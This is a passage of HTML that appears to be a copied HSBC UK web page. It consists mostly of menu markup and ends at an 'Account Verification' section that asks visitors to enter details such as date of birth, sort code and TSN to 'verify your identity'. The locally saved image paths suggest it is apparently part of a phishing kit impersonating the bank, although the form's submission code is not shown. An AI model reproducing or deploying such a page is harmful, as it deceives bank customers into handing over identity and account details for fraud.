                                                            <a href="http://www.hsbc.co.uk/1/2/mortgages/mortgage-rates" title="View all mortgages" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/Mortgages/ViewAll/Tab','WT.ti','Doormat:Borrowing:Mortgages:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
												all <span class="hidden">mortgages</span>
											</a>
                                                        </p>
                                                    </div>

                                                    <div class="column">
                                                        <h3>
											<a href="http://www.hsbc.co.uk/current-accounts/products/overdrafts/" title="Overdraft service" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/Overdrafts/Tab','WT.ti','Doormat:Homepage:Borrowing:Overdrafts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Overdraft service</a>
										</h3>

                                                        <p>Manage your money by agreeing a formal overdraft facility and keeping within its limit.</p>

                                                        <p class="ctaLink">
                                                            <a href="http://www.hsbc.co.uk/current-accounts/products/overdrafts/" title="Learn more about overdrafts" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/MortgagesRates/ViewAll/Tab','WT.ti','Doormat:Homepage:Borrowing:MortgagesRates:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Learn
												more<span class="hidden"> about overdrafts</span>
											</a>
                                                        </p>

                                                        <h3>
											<a href="http://www.hsbc.co.uk/1/2/customer-support" title="Customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer
												support</a>
										</h3>

                                                        <ul>
                                                            <li><a href="http://www.hsbc.co.uk/1/2/customer-support/money-worries/managing-your-finances" title="Taking control of your finances" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/TakingControlOfYourFinances/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:TakingControlOfYourFinances:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Taking
													control of your finances</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/customer-support/money-worries/mortgage-repayments" title="Managing your mortgage payments" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/ManagingMortgagePayments/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:ManagingMortgagePayments:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Managing
													your mortgage payments</a>
                                                            </li>

                                                            <li><a href="http://financialplanning.hsbc.co.uk/events/buying-your-first-home" title="Buying your first home" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/MortgageFTBGuide/Tab','WT.ti','Doormat:Homepage:Borrowing:MortgageFTBGuide:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Buying
													your first home</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/mortgages/jargon" title="Mortgage jargon buster" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/MortgageJargonBuster/Tab','WT.ti','Doormat:Homepage:Borrowing:MortgageJargonBuster:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Mortgage
													jargon buster</a>
                                                            </li>
                                                        </ul>

                                                        <p class="ctaLink">
                                                            <a href="https://www.hsbc.co.uk/help/" title="View all customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Borrowing/CustomerSupport/ViewAll/Tab','WT.ti','Doormat:Homepage:Borrowing:CustomerSupport:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
												all <span class="hidden">customer support</span>
											</a>
                                                        </p>
                                                    </div>

                                                    <div class="column">
                                                        <a tabindex="-1" href="http://www.hsbc.co.uk/1/2/credit-cards" title="HSBC Credit cards. Find out more." onclick="dcsMultiTrack('DCS.dcsuri','/Homepage/Doormat/Borrowing/PromoSlot1/Tab','WT.ti','Homepage:Doormat:Borrowing:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');"><img tabindex="0" class="focusOnImage" alt="HSBC Credit cards. Find out more." src="files/img/163x155px_creditcards_d207.jfif" style="margin-bottom: 20px;" width="163" height="155">
                                                        </a>
                                                        <a tabindex="-1" href="http://www.hsbc.co.uk/1/2/loans" title="Looking for a loan? Find out more." onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Borrowing/LookingForALoan/Tab?WT.ac=HBEU_Doormat_Homepage_Borrowing_LookingForALoan','WT.ti','Doormat:Borrowing:LookingForALoan:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WTsi_n','','WT.si_x','');"><img tabindex="0" class="focusOnImage" alt="Looking for a loan? Find out more." src="files/img/163x155_loan_tuktuk_d182.jfif" width="163" height="155">
                                                        </a>
                                                    </div>
                                                </div>

                                            </div>
                                        </div>
                                    </li>
                                    <li class="level1" id="dijit__WidgetBase_2" widgetid="dijit__WidgetBase_2"><a tabindex="0" href="javascript:void(0)" class="mainTopNav"><strong>Investing</strong><br> Products
							&amp; analysis</a>
                                        <div class="doormatWrapper fourColRight" style="opacity: 0; display: none;" aria-hidden="true">
                                            <div class="arrow">&nbsp;</div>

                                            <div class="doormat">
                                                <p class="skipLink">
                                                    <a href="#" title="Move to Insurance navigation">Move to
										Insurance navigation</a>
                                                </p>

                                                <div class="doormatLeft">
                                                    <div class="column">
                                                        <h3>
											<a href="https://investments.hsbc.co.uk/products" title="Investments" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Investments</a>
										</h3>

                                                        <ul>
                                                            <li><a href="https://investments.hsbc.co.uk/product/206/investment-funds-online" title="Investment funds" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Funds/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Funds:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Investment
													funds</a>
                                                            </li>

                                                            <li><a href="https://investments.hsbc.co.uk/product/5/sif-isa" title="Selected Investment Funds ISA" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Investing/Investments/FundsISA/Tab','WT.ti','Doormat:Investing:Investments:FundsISA:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Selected
													Investment Funds ISA</a>
                                                            </li>

                                                            <li><a href="https://investments.hsbc.co.uk/product/9/sharedealing" title="Sharedealing" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Sharedealing/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Sharedealing:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Sharedealing</a>
                                                            </li>

                                                            <li><a href="http://investments.hsbc.co.uk/product/19/hsbc-premier-financial-advice" title="HSBC Premier Financial Advice" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/PremierAdvice/Tab','WT.ti','Doormat:Homepage:Investing:Investments:PremierAdvice:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
													Premier Financial Advice</a>
                                                            </li>
                                                        </ul>

                                                        <p class="ctaLink">
                                                            <a href="https://investments.hsbc.co.uk/products" title="View all investments" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/Products/ViewAll/Tab','WT.ti','Doormat:Homepage:Investing:Investments:Product:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
												all <span class="hidden">investments</span>
											</a>
                                                        </p>

                                                        <h3>
											<a href="https://investments.hsbc.co.uk/product/206/investing-in-funds-online" title="Global Investment Centre" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/GIC/Tab','WT.ti','Doormat:Homepage:Investing:Investments:GIC:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Global
												Investment Centre</a>
										</h3>

                                                        <p>Trade funds online</p>

                                                        <p class="ctaLink">
                                                            <a href="https://investments.hsbc.co.uk/product/206/investing-in-funds-online" title="Find out more about trading funds online" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/Investments/GIC/Tab','WT.ti','Doormat:Homepage:Investing:Investments:GIC:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Find
												out more <span class="hidden">about trading funds
													online</span>
											</a>
                                                        </p>

                                                        <h3>
											<a href="https://investments.hsbc.co.uk/news" title="Financial news and analysis." class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Investing_PromoSlot1','WT.ti','Doormat:Homepage:Investing:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
												Expert opinion, news and analysis.</a>
										</h3>
                                                    </div>

                                                    <div class="column">
                                                        <h3>
											<a href="https://investments.hsbc.co.uk/why-invest-with-us" title="Why invest with us?" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Investing/WhyInvestWithUs/Tab','WT.ti','Doormat:Homepage:Investing:WhyInvestWithUs:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Why
												invest with us?</a>
										</h3>
                                                    </div>

                                                    <div class="column">
                                                        <a tabindex="-1" href="https://investments.hsbc.co.uk/products" title="HSBC Products. The value of investments (and any income received from them) can fall as well as rise and you may not get back what you invested. Find out more." onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Investing/ISA/PromoSlot/Tab','WT.ti','Doormat:Investing:ISA:PromoSlot:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');"><img tabindex="0" class="focusOnImage" alt="HSBC Products. The value of investments (and any income received from them) can fall as well as rise and you may not get back what you invested. Find out more." src="files/img/isa_326x310_d302_v03.jfif" width="326" height="310">
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </li>
                                    <li class="level1" id="dijit__WidgetBase_3" widgetid="dijit__WidgetBase_3"><a tabindex="0" href="javascript:void(0)" class="mainTopNav"><strong>Insurance</strong><br>
							Property &amp; family</a>
                                        <div class="doormatWrapper fourColRight" style="opacity: 0; display: none;" aria-hidden="true">
                                            <div class="arrow">&nbsp;</div>

                                            <div class="doormat">
                                                <p class="skipLink">
                                                    <a href="#" title="Move to site search">Move Planning
										navigation</a>
                                                </p>

                                                <div class="doormatLeft">
                                                    <div class="column">
                                                        <h3>
											<a href="http://www.hsbc.co.uk/insurance/products/travel/" title="Travel Insurance" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/HeaderLink/TravelInsurance/Tab','WT.ti','Doormat:Homepage:Insurance:HeaderLink:TravelInsurance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel</a>
										</h3>

                                                        <ul>
                                                            <li><a href="http://www.hsbc.co.uk/insurance/products/travel/" title="Travel Insurance" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/TravelInsurance/Tab','WT.ti','Doormat:Homepage:Insurance:TravelInsurance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel
													Insurance</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/insurance/products/premier-travel/" title="HSBC Premier Travel Insurance" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/PremierTravelInsurance/Tab','WT.ti','Doormat:Homepage:Insurance:PremierTravelInsurance:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">HSBC
													Premier Travel Insurance</a>
                                                            </li>
                                                        </ul>

                                                        <h3>
											<a href="http://www.hsbc.co.uk/insurance/products/home/" title="Home Insurance" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Insurance/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Insurance_PromoSlot1','WT.ti','Doormat:Insurance:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Home
												Insurance</a>
										</h3>

                                                    </div>

                                                    <div class="column">

                                                        <h3>
											<a href="http://www.hsbc.co.uk/insurance" title="View all HSBC Insurance options" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/AllInsuranceProducts/Tab','WT.ti','Doormat:Homepage:Insurance:AllInsuranceProducts:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
												all HSBC Insurance options</a>
										</h3>

                                                        <h3>
											<a href="http://www.hsbc.co.uk/1/2/customer-support" title="Customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/CustomerSupport/Tab','WT.ti','Doormat:Homepage:Insurance:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer
												support</a>
										</h3>

                                                        <ul>
                                                            <li><a href="http://www.hsbc.co.uk/1/2/insurance/home-insurance/contact" title="Home Insurance claims" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/HomeInsurance/MakingAClaim/Tab','WT.ti','Doormat:Homepage:Insurance:HomeInsurance:MakingAClaim:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Home
													Insurance claims</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/insurance/travel-insurance/contact" title="Travel Insurance claims" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/TravelInsurance/MakingAClaim/Tab','WT.ti','Doormat:Homepage:Insurance:TravelInsurance:MakingAClaim:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Travel
													Insurance claims</a>
                                                            </li>

                                                            <li><a href="http://www.hsbc.co.uk/1/2/insurance/premier-travel-insurance" title="Premier Travel Insurance claims" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/PremierTravelInsurance/MakingAClaim/Tab','WT.ti','Doormat:Homepage:Insurance:PremierTravelInsurance:MakingAClaim:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Premier
													Travel Insurance claims</a>
                                                            </li>
                                                        </ul>

                                                        <p class="ctaLink">
                                                            <a href="http://www.hsbc.co.uk/1/2/customer-support" title="View all customer support" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Insurance/CustomerSupport/ViewAll/Tab','WT.ti','Doormat:Homepage:Insurance:CustomerSupport:ViewAll:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">View
												all <span class="hidden">customer support</span>
											</a>
                                                        </p>
                                                    </div>

                                                    <div class="column">
                                                        <a tabindex="-1" href="http://www.hsbc.co.uk/1/2/insurance/life-illness-income-cover" title="Life, critical illness and income. Learn more." onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Insurance/PromoSlot2/Tab?WT.ac=HBEU_Doormat_Homepage_Insurance_PromoSlot3','WT.ti','Doormat:Insurance:PromoSlot2:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');"><img tabindex="0" class="focusOnImage" alt="Life, critical illness and income. Have you thought about how your loved ones would cope financially if anything happened to you? Find out more." src="files/img/326_155px_Insuring_Life.jfif" style="margin-bottom: 20px;" width="326" height="155">
                                                        </a>
                                                        <a tabindex="-1" href="http://www.hsbc.co.uk/1/2/insurance" title="Protect the things that matter. Learn more." onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Insurance/PromoSlot2/Tab?WT.ac=HBEU_Doormat_Homepage_Insurance_PromoSlot3','WT.ti','Doormat:Insurance:PromoSlot3:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');"><img tabindex="0" class="focusOnImage" alt="Protect the things that matter. From your house and car to your next holiday, we offer a range of policies to protect what's important. Learn more." src="files/img/326_155_insurance_protect_d182.jfif" width="326" height="155">
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </li>

                                    <li class="level1" id="dijit__WidgetBase_4" widgetid="dijit__WidgetBase_4"><a tabindex="0" href="javascript:void(0)" class="mainTopNav"><strong>Life events</strong><br>
							Help and support</a>
                                        <div class="doormatWrapper fourColRight" style="opacity: 0; display: none;" aria-hidden="true">
                                            <div class="arrow">&nbsp;</div>

                                            <div class="doormat">
                                                <p class="skipLinkLast">
                                                    <a title="Move to main content" tabindex="0">Move to main content</a>
                                                </p>

                                                <div class="doormatLeft">
                                                    <div class="column">
                                                        <h3>
											<a href="http://financialplanning.hsbc.co.uk/#/all" title="Life events" class="extLink" onclick="">Life
												events</a>
										</h3>
                                                        <ul>
                                                            <li><a href="http://financialplanning.hsbc.co.uk/events/dealing-with-bereavement" role="link" title="Bereavement support" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/BereavementSupport/Tab','WT.ti','Doormat:Homepage:Planning:BereavementSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Bereavement													support</a>
                                                            </li>

                                                            <li><a href="http://financialplanning.hsbc.co.uk/events/dealing-with-separation" role="link" title="Separation support" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/SeparationSupport/Tab','WT.ti','Doormat:Homepage:Planning:SeparationSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Separation
													support</a>
                                                            </li>

                                                            <li><a href="http://financialplanning.hsbc.co.uk/events/settling-in-the-uk" title="Settling in the UK" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/SettlingInTheUK/Tab','WT.ti','Doormat:Homepage:Planning:SettlingInTheUK:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Settling
													in the UK</a>
                                                            </li>

                                                            <li><a href="http://financialplanning.hsbc.co.uk/events/getting-married" title="Getting married" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/GettingMarried/Tab','WT.ti','Doormat:Homepage:Planning:GettingMarried:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Getting
													married</a>
                                                            </li>

                                                            <li><a href="http://financialplanning.hsbc.co.uk/events/planning-your-retirement" title="Planning your retirement" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/PlanningYourRetirement/Tab','WT.ti','Doormat:Homepage:Planning:PlanningYourRetirement:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Planning
													your retirement</a>
                                                            </li>

                                                            <li><a href="http://financialplanning.hsbc.co.uk/events/growing-your-wealth" title="Growing your wealth" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/GrowingYourWealth/Tab','WT.ti','Doormat:Homepage:Planning:GrowingYourWealth:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Growing
													your wealth</a>
                                                            </li>

                                                            <li><a href="http://financialplanning.hsbc.co.uk/events/moving-abroad" title="Moving abroad" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/MovingAbroad/Tab','WT.ti','Doormat:Homepage:Planning:MovingAbroad:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Moving
													abroad</a>
                                                            </li>
                                                        </ul>

                                                        <h3>
											<a href="http://financialplanning.hsbc.co.uk/planningtools" title="Planning tools" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/PlanningTools/Tab','WT.ti','Doormat:Homepage:Planning:PlanningTools:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Planning
												tools</a>
										</h3>

                                                        <ul>
                                                            <li><a href="http://financialplanning.hsbc.co.uk/tool/800/financial-health-check" title="Financial health check" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Homepage/Planning/FinancialHealthCheck/Tab','WT.ti','Doormat:Homepage:Planning:FinancialHealthCheck:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Financial
													health check</a>
                                                            </li>
                                                        </ul>
                                                    </div>

                                                    <div class="column">
                                                        <h3>
											<a href="http://financialplanning.hsbc.co.uk/events/protecting-what-matters" title="Protecting what matters" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Planning/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Planning_PromoSlot1','WT.ti','Doormat:Planning:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Protecting
												what matters</a>
										</h3>

                                                        <p class="ctaLink">
                                                            <a href="http://financialplanning.hsbc.co.uk/events/protecting-what-matters" title="Protecting what matters. Learn more." class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Planning/PromoSlot1/Tab?WT.ac=HBEU_Doormat_Homepage_Planning_PromoSlot1','WT.ti','Doormat:Planning:PromoSlot1:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Learn
												more</a>
                                                        </p>

                                                        <h3>
											<a href="https://www.hsbc.co.uk/help/" title="Customer support" onclick="dcsMultiTrack('DCS.dcsuri','Doormat/Homepage/Planning/CustomerSupport/Tab','WT.ti', 'Doormat:Homepage:Planning:CustomerSupport:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Customer
												support</a>
										</h3>

                                                        <ul>
                                                            <li><a href="http://financialplanning.hsbc.co.uk/events/ways-we-can-help" title="Ways we can help" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','Doormat/Homepage/Planning/CustomerSupport/NeedAdvice/Tab','WT.ti','Doormat:Homepage:Planning:CustomerSupport:NeedAdvice:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Ways
													we can help</a>
                                                            </li>

                                                            <li><a href="http://financialplanning.hsbc.co.uk/article/81/frequently-asked-questions" title="Frequently asked questions" class="extLink" onclick="dcsMultiTrack('DCS.dcsuri','Doormat/Homepage/Planning/CustomerSupport/FAQs/Tab','WT.ti', 'Doormat:Homepage:Planning:CustomerSupport:FAQs/Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');">Frequently
													asked questions</a>
                                                            </li>
                                                        </ul>
                                                    </div>

                                                    <div class="column">
                                                        <a tabindex="-1" href="http://financialplanning.hsbc.co.uk/events/moving-abroad" title="Heading off on a new adventure?" onclick="dcsMultiTrack('DCS.dcsuri','/Doormat/Planning/PromoSlot2/Tab?WT.ac=HBEU_Doormat_Homepage_Planning_PromoSlot2','WT.ti','Doormat:Planning:PromoSlot2:Tab','WT.pn_sku','','WT.tx_u','','WT.tx_e','','HSBC_u','','HSBC_e','','WT.si_n','','WT.si_x','');"><img tabindex="0" class="focusOnImage" alt="Heading off on a new adventure? We know there's a lot for you to think about when moving abroad, which is why we can help you transfer your finances as well as provide information on what to do before and after you leave the UK. Learn more." src="files/img/326x310_moving_abroad_d182.jfif" width="326" height="310">
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div id="_topContent" data-dojo-type="dijit/layout/ContentPane" data-dojo-attach-point="topContent" data-dojo-props="splitter:false, region:'top'" class="dijitContentPane" title="" role="group" widgetid="_topContent">
                <div id="dijit__WidgetsInTemplateMixin_0" widgetid="dijit__WidgetsInTemplateMixin_0">
                    <div data-dojo-type="dijit/layout/ContentPane" class="dijitContentPane" title="" role="group" id="dijit_layout_ContentPane_0" widgetid="dijit_layout_ContentPane_0">
                        <div class="pageHeaderBg">
                            <div class="pageHeading row">
                                <div class="pageHeadingInner">
                                    <h2>Account Verification</h2>
                                </div>
                            </div>
                        </div>
                        <div class="innerPage noPrint" dir="ltr" id="askquestion">
                            <div class="grid grid_24">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="innerPage" id="innerPage">
                <div class="grid_skin">
                    <div id="_stepTracker" data-dojo-type="dijit/layout/ContentPane" data-dojo-attach-point="stepTracker" data-dojo-props="splitter:false, region:'top'" class="dijitContentPane" title="" role="group" widgetid="_stepTracker">
                        <div class="row stepCount6" id="dijit__WidgetsInTemplateMixin_1" widgetid="dijit__WidgetsInTemplateMixin_1">
                            <div class="grid grid_24">

                            </div>
                        </div>
                    </div>

                    <div class="dijitStackContainer dijitContainer dijitLayoutContainer row" id="_body" data-dojo-type="dijit/layout/StackContainer" data-dojo-attach-point="stack" data-dojo-props="splitter:false, region:'center', selected:true" widgetid="_body">
                        <div id="dijit__WidgetsInTemplateMixin_9" widgetid="dijit__WidgetsInTemplateMixin_9" class="dijitStackContainer-child dijitHidden" title="">
                            <div id="errorMsgDiv" style="display:none;" class="headerBottom15">
                                <div role="alert" class="alertBox" id="hsbcwidget_AlertBox_1" title="" widgetid="hsbcwidget_AlertBox_1" aria-hidden="false">
                                    <div class="alertBoxInner" role="alert">
                                        <span class="hidden">Alert Box</span>
                                        <div data-dojo-attach-point="containerNode">
                                            <br>
                                            <p id="msg" class="pt6">
                                                Error will display here
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div id="dijit__WidgetsInTemplateMixin_10" widgetid="dijit__WidgetsInTemplateMixin_10" class="dijitStackContainer-child dijitHidden" title="">
                            <style type="text/css">
                                .ursula #DOB .textInputnew input,
                                .ursula #SORTCODE .textInputnew input,
                                .ursula #TSN .textInputnew input {
                                    width: 30px;
                                }
                                
                                .ursula #DOB .textInputnew .dijitValidationTextBox input.dijitInputInner,
                                .ursula #SORTCODE .textInputnew .dijitValidationTextBox input.dijitInputInner,
                                .ursula #TSN .textInputnew .dijitValidationTextBox input.dijitInputInner {
                                    border: 1px solid #7FC153;
                                    background: no-repeat scroll right center transparent;
                                }
                                
                                .ursula #DOB .textInputnew .dijitValidationTextBoxError input.dijitInputInner,
                                .ursula #SORTCODE .textInputnew .dijitValidationTextBoxError input.dijitInputInner,
                                .ursula #TSN .textInputnew .dijitValidationTextBoxError input.dijitInputInner {
                                    border: 1px solid #E23320;
                                    background: no-repeat scroll right center transparent;
                                }
                                
                                .ursula #DOB .textInputnew .dijitTextBoxIncomplete input.dijitInputInner,
                                .ursula #SORTCODE .textInputnew .dijitTextBoxIncomplete input.dijitInputInner,
                                .ursula #TSN .textInputnew .dijitTextBoxIncomplete input.dijitInputInner {
                                    border: 1px solid #BCBEC0;
                                }
                                
                                .suplabel {
                                    color: #767676;
                                    font-size: 9pt;
                                }
                            </style>

                            <div class="grid_skin">
                                <div class="row bottomPadding0">
                                    <div class="containerStyle17">
                                        <h3>Verify identity</h3>
                                    </div>
                                </div>
                            </div>
                            <div class="containerStyle02">

                                <p>Please enter the required details below in order to verify your identity and your account.</p>
